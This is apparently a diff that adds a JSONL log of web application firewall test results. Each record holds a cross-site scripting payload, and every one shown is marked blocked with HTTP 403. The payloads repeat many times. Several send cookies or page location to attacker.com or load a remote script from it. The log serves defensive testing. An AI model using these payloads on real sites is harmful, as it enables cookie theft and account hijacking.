@@ -1,0 +1,340 @@
+{"payload": "<script src=\"https://attacker.com/xss.js\"></script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.009152434999123216}
+{"payload": "<img src=\"x\" onerror=\"fetch('https://attacker.com?c='+document.cookie)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0048849820013856515}
+{"payload": "<svg onload=\"fetch('https://attacker.com?d='+document.domain)\"></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004072608993737958}
+{"payload": "<body onload=\"fetch('https://attacker.com?l='+location)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005450598007882945}
+{"payload": "<input value=\"<img src=x onerror=alert(1)>\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0047888910048641264}
+{"payload": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003767759000766091}
+{"payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0031735809898236766}
+{"payload": "<a href=\"javascript:alert(1)\">Click me</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005381516006309539}
+{"payload": "<svg><script>alert(1)</script></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004548955999780446}
+{"payload": "<svg onload=alert(document.cookie)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037607999984174967}
+{"payload": "<img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003640959010226652}
+{"payload": "\"><script>alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038095630006864667}
+{"payload": "<script>alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035174130025552586}
+{"payload": "<details open ontoggle=alert(1)></details>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002842123998561874}
+{"payload": "<div onpointerenter=alert(1)>Hover me</div>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002768517006188631}
+{"payload": "<button onclick=\"alert(1)\">Click</button>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004295712991734035}
+{"payload": "\"><img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005607229002634995}
+{"payload": "<marquee onstart=alert(1)>XSS</marquee>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0052000860014231876}
+{"payload": "<a href=\"javascript:alert(document.cookie)\">Click</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004514699001447298}
+{"payload": "\"><img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005393829007516615}
+{"payload": "<svg><g onload=alert(1)></g></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004601345994160511}
+{"payload": "<x onmouseover=alert(1)>Hover</x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00419464499282185}
+{"payload": "<iframe src=javascript:alert(1)></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0039804749976610765}
+{"payload": "<svg onload=alert(1)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033227530075237155}
+{"payload": "<script>alert('XSS')</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003397521999431774}
+{"payload": "\"><script>alert(document.cookie)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0029339689936023206}
+{"payload": "<x onmouseover=alert(document.domain)>Hover</x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004618128994479775}
+{"payload": "<img src=x onerror=alert(location)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004762886994285509}
+{"payload": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00708208599826321}
+{"payload": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007813188000000082}
+{"payload": "<script>fetch('https://attacker.com?d='+document.domain)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006521146991872229}
+{"payload": "<iframe src=\"https://attacker.com?c=\"+document.cookie></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0061048109928378835}
+{"payload": "<body onload=fetch('https://attacker.com?l='+location)></body>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006031019001966342}
+{"payload": "\"><img src=x onerror=alert('XSS')>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005416878004325554}
+{"payload": "<script src=\"https://attacker.com/xss.js\"></script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005529905000003055}
+{"payload": "<img src=\"x\" onerror=\"fetch('https://attacker.com?c='+document.cookie)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005250483998679556}
+{"payload": "<svg onload=\"fetch('https://attacker.com?d='+document.domain)\"></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004199792994768359}
+{"payload": "<body onload=\"fetch('https://attacker.com?l='+location)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003964763003750704}
+{"payload": "<input value=\"<img src=x onerror=alert(1)>\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004083801002707332}
+{"payload": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005311650005751289}
+{"payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0051271470001665875}
+{"payload": "<a href=\"javascript:alert(1)\">Click me</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004297330990084447}
+{"payload": "<svg><script>alert(1)</script></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003841566009214148}
+{"payload": "<svg onload=alert(document.cookie)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036770580045413226}
+{"payload": "<img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005433928003185429}
+{"payload": "\"><script>alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005854799004737288}
+{"payload": "<script>alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006592364006792195}
+{"payload": "<details open ontoggle=alert(1)></details>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006098858997575007}
+{"payload": "<div onpointerenter=alert(1)>Hover me</div>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007049562002066523}
+{"payload": "<button onclick=\"alert(1)\">Click</button>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007541077007772401}
+{"payload": "\"><img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037275750073604286}
+{"payload": "<marquee onstart=alert(1)>XSS</marquee>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0044901219953317195}
+{"payload": "<a href=\"javascript:alert(document.cookie)\">Click</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004327137998188846}
+{"payload": "\"><img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004202209005597979}
+{"payload": "<svg><g onload=alert(1)></g></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035618770052678883}
+{"payload": "<x onmouseover=alert(1)>Hover</x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003899636009009555}
+{"payload": "<iframe src=javascript:alert(1)></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00348048000887502}
+{"payload": "<svg onload=alert(1)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003321356009109877}
+{"payload": "<script>alert('XSS')</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0030072310037212446}
+{"payload": "\"><script>alert(document.cookie)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00292925100075081}
+{"payload": "<x onmouseover=alert(document.domain)>Hover</x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004025419009849429}
+{"payload": "<img src=x onerror=alert(location)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0031639720109524205}
+{"payload": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032799460022943094}
+{"payload": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00321352799073793}
+{"payload": "<script>fetch('https://attacker.com?d='+document.domain)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0030328790016938}
+{"payload": "<iframe src=\"https://attacker.com?c=\"+document.cookie></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00407060599536635}
+{"payload": "<body onload=fetch('https://attacker.com?l='+location)></body>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003471304997219704}
+{"payload": "\"><img src=x onerror=alert('XSS')>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033619090099819005}
+{"payload": "<script src=\"https://attacker.com/xss.js\"></script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0031282469863072038}
+{"payload": "<img src=\"x\" onerror=\"fetch('https://attacker.com?c='+document.cookie)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00549042499915231}
+{"payload": "<svg onload=\"fetch('https://attacker.com?d='+document.domain)\"></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007032440000330098}
+{"payload": "<body onload=\"fetch('https://attacker.com?l='+location)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004299395004636608}
+{"payload": "<input value=\"<img src=x onerror=alert(1)>\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004814494997845031}
+{"payload": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005521037994185463}
+{"payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003938548004953191}
+{"payload": "<a href=\"javascript:alert(1)\">Click me</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004095018011867069}
+{"payload": "<svg><script>alert(1)</script></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0054509519977727905}
+{"payload": "<svg onload=alert(document.cookie)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004464664001716301}
+{"payload": "<img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038485979894176126}
+{"payload": "\"><script>alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003229708003345877}
+{"payload": "<script>alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004511815001023933}
+{"payload": "<details open ontoggle=alert(1)></details>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036184560012770817}
+{"payload": "<div onpointerenter=alert(1)>Hover me</div>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003385985008208081}
+{"payload": "<button onclick=\"alert(1)\">Click</button>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003074516003835015}
+{"payload": "\"><img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003629617000115104}
+{"payload": "<marquee onstart=alert(1)>XSS</marquee>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003676118009025231}
+{"payload": "<a href=\"javascript:alert(document.cookie)\">Click</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037601879885187373}
+{"payload": "\"><img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003686458003357984}
+{"payload": "<svg><g onload=alert(1)></g></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032762880000518635}
+{"payload": "<x onmouseover=alert(1)>Hover</x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036797940119868144}
+{"payload": "<iframe src=javascript:alert(1)></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0039035630034049973}
+{"payload": "<svg onload=alert(1)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004575918996124528}
+{"payload": "<script>alert('XSS')</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004574343009153381}
+{"payload": "\"><script>alert(document.cookie)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005513238997082226}
+{"payload": "<x onmouseover=alert(document.domain)>Hover</x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0048196089919656515}
+{"payload": "<img src=x onerror=alert(location)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003724941998370923}
+{"payload": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004054359000292607}
+{"payload": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004601014996296726}
+{"payload": "<script>fetch('https://attacker.com?d='+document.domain)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037990900018485263}
+{"payload": "<iframe src=\"https://attacker.com?c=\"+document.cookie></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036578209983417764}
+{"payload": "<body onload=fetch('https://attacker.com?l='+location)></body>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038717029965482652}
+{"payload": "\"><img src=x onerror=alert('XSS')>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0042472659988561645}
+{"payload": "<script src=\"https://attacker.com/xss.js\"></script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004507976002059877}
+{"payload": "<img src=\"x\" onerror=\"fetch('https://attacker.com?c='+document.cookie)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004275079001672566}
+{"payload": "<svg onload=\"fetch('https://attacker.com?d='+document.domain)\"></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004192549007711932}
+{"payload": "<body onload=\"fetch('https://attacker.com?l='+location)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004156080991378985}
+{"payload": "<input value=\"<img src=x onerror=alert(1)>\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036803249968215823}
+{"payload": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035952119942521676}
+{"payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003675275991554372}
+{"payload": "<a href=\"javascript:alert(1)\">Click me</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004739130003144965}
+{"payload": "<svg><script>alert(1)</script></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005109734003781341}
+{"payload": "<svg onload=alert(document.cookie)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0041416360036237165}
+{"payload": "<img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004421785997692496}
+{"payload": "\"><script>alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0039099880086723715}
+{"payload": "<script>alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004346967005403712}
+{"payload": "<details open ontoggle=alert(1)></details>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003480753002804704}
+{"payload": "<div onpointerenter=alert(1)>Hover me</div>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004558593005640432}
+{"payload": "<button onclick=\"alert(1)\">Click</button>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003817217002506368}
+{"payload": "\"><img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037057159934192896}
+{"payload": "<marquee onstart=alert(1)>XSS</marquee>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038799169997218996}
+{"payload": "<a href=\"javascript:alert(document.cookie)\">Click</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004950882997945882}
+{"payload": "\"><img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00444909899670165}
+{"payload": "<svg><g onload=alert(1)></g></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036541600129567087}
+{"payload": "<x onmouseover=alert(1)>Hover</x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003013169000041671}
+{"payload": "<iframe src=javascript:alert(1)></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032868919952306896}
+{"payload": "<svg onload=alert(1)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003177752994815819}
+{"payload": "<script>alert('XSS')</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003208187990821898}
+{"payload": "\"><script>alert(document.cookie)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003033111002878286}
+{"payload": "<x onmouseover=alert(document.domain)>Hover</x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002859617001377046}
+{"payload": "<img src=x onerror=alert(location)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0029329990065889433}
+{"payload": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0028776519902748987}
+{"payload": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003031326996278949}
+{"payload": "<script>fetch('https://attacker.com?d='+document.domain)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0028154720057500526}
+{"payload": "<iframe src=\"https://attacker.com?c=\"+document.cookie></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0026958719972753897}
+{"payload": "<body onload=fetch('https://attacker.com?l='+location)></body>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003257390999351628}
+{"payload": "\"><img src=x onerror=alert('XSS')>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003064371005166322}
+{"payload": "<script src=\"https://attacker.com/xss.js\"></script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00279514399881009}
+{"payload": "<img src=\"x\" onerror=\"fetch('https://attacker.com?c='+document.cookie)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002966744010336697}
+{"payload": "<svg onload=\"fetch('https://attacker.com?d='+document.domain)\"></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0028874400013592094}
+{"payload": "<body onload=\"fetch('https://attacker.com?l='+location)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003382222988875583}
+{"payload": "<input value=\"<img src=x onerror=alert(1)>\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0028646270075114444}
+{"payload": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032800439948914573}
+{"payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0030293440067907795}
+{"payload": "<a href=\"javascript:alert(1)\">Click me</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035816710005747154}
+{"payload": "<svg><script>alert(1)</script></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004145954997511581}
+{"payload": "<svg onload=alert(document.cookie)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004238175999489613}
+{"payload": "<img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0041303110047010705}
+{"payload": "\"><script>alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038457730115624145}
+{"payload": "<script>alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003392783008166589}
+{"payload": "<details open ontoggle=alert(1)></details>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0030965119949541986}
+{"payload": "<div onpointerenter=alert(1)>Hover me</div>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003580582997528836}
+{"payload": "<button onclick=\"alert(1)\">Click</button>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035076630010735244}
+{"payload": "\"><img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003599495001253672}
+{"payload": "<marquee onstart=alert(1)>XSS</marquee>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003834907998680137}
+{"payload": "<a href=\"javascript:alert(document.cookie)\">Click</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033980439911829308}
+{"payload": "\"><img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032807209936436266}
+{"payload": "<svg><g onload=alert(1)></g></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003961540991440415}
+{"payload": "<x onmouseover=alert(1)>Hover</x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004026071008411236}
+{"payload": "<iframe src=javascript:alert(1)></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036640480102505535}
+{"payload": "<svg onload=alert(1)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00523602101020515}
+{"payload": "<script>alert('XSS')</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006840319998445921}
+{"payload": "\"><script>alert(document.cookie)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007141750000300817}
+{"payload": "<x onmouseover=alert(document.domain)>Hover</x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005009190004784614}
+{"payload": "<img src=x onerror=alert(location)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00417778299015481}
+{"payload": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003933821004466154}
+{"payload": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005851769994478673}
+{"payload": "<script>fetch('https://attacker.com?d='+document.domain)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004514348009251989}
+{"payload": "<iframe src=\"https://attacker.com?c=\"+document.cookie></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004081056002178229}
+{"payload": "<body onload=fetch('https://attacker.com?l='+location)></body>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004625221001333557}
+{"payload": "\"><img src=x onerror=alert('XSS')>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005109161007567309}
+{"payload": "<script src=\"https://attacker.com/xss.js\"></script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003847276995657012}
+{"payload": "<img src=\"x\" onerror=\"fetch('https://attacker.com?c='+document.cookie)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003795415992499329}
+{"payload": "<svg onload=\"fetch('https://attacker.com?d='+document.domain)\"></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00589755798864644}
+{"payload": "<body onload=\"fetch('https://attacker.com?l='+location)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004136461007874459}
+{"payload": "<input value=\"<img src=x onerror=alert(1)>\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003358747999300249}
+{"payload": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004064975000801496}
+{"payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006594457008759491}
+{"payload": "<a href=\"javascript:alert(1)\">Click me</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005421310997917317}
+{"payload": "<svg><script>alert(1)</script></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004300818996853195}
+{"payload": "<svg onload=alert(document.cookie)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0061465259932447225}
+{"payload": "<img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004761744989082217}
+{"payload": "\"><script>alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004449497995665297}
+{"payload": "<script>alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004724165992229246}
+{"payload": "<details open ontoggle=alert(1)></details>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004903988010482863}
+{"payload": "<div onpointerenter=alert(1)>Hover me</div>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004918566002743319}
+{"payload": "<button onclick=\"alert(1)\">Click</button>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0041126970027107745}
+{"payload": "\"><img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004926970999804325}
+{"payload": "<marquee onstart=alert(1)>XSS</marquee>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003962955001043156}
+{"payload": "<a href=\"javascript:alert(document.cookie)\">Click</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004084385000169277}
+{"payload": "\"><img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00360451900633052}
+{"payload": "<svg><g onload=alert(1)></g></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035069619916612282}
+{"payload": "<x onmouseover=alert(1)>Hover</x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00313717000244651}
+{"payload": "<iframe src=javascript:alert(1)></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0028655070054810494}
+{"payload": "<svg onload=alert(1)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002746291007497348}
+{"payload": "<script>alert('XSS')</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0028450740064727142}
+{"payload": "\"><script>alert(document.cookie)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003217986013623886}
+{"payload": "<x onmouseover=alert(document.domain)>Hover</x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0028406000055838376}
+{"payload": "<img src=x onerror=alert(location)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0027710639988072217}
+{"payload": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003002151002874598}
